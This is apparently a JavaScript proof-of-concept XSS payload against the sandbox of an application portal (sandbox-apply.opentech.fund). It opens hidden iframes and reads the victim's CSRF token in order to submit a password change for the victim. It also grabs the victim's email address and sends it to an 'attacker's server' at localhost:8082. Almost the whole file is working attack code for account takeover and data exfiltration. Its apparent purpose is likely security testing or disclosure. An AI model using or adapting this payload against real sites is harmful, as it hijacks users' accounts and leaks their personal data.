// Bypassing CSRF to change victim’s password:
document.writeln('<iframe id="iframe" src="https://sandbox-apply.opentech.fund/account/activate/" width="0" height="0" onload="ReadCsrfAndAttack()"></iframe>');

function ReadCsrfAndAttack()
{
var iframeDoc = document.getElementById("iframe").contentDocument;
var victim_csrfmiddlewaretoken = iframeDoc.forms[1].elements.csrfmiddlewaretoken.value;

// ATTACK: Change victim’s password
var url = "/account/activate/";
var new_password="sandbox-test";
var params = "csrfmiddlewaretoken=" + victim_csrfmiddlewaretoken + "&password1=the-new-password&password2=the-new-password";
var xhr = new XMLHttpRequest();
xhr.open("POST", url, true);
xhr.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xhr.send(params);
}

// Send the victim’s email to attacker:
document.writeln('<iframe id="iframe" src="https://sandbox-apply.opentech.fund/account/" width="0" height="0" onload="GetVictimEmailAndSend()"></iframe>');
var victim_email = "";

function GetVictimEmailAndSend()
{
victim_email = document.getElementById("iframe").contentDocument.forms[0].elements.email.value;

// Send GET request to attacker’s server:
var xmlHttp = new XMLHttpRequest();
xmlHttp.open( "GET", "http://localhost:8082/?victim="+ victim_email, false );
xmlHttp.send( null );
return xmlHttp.responseText;
}
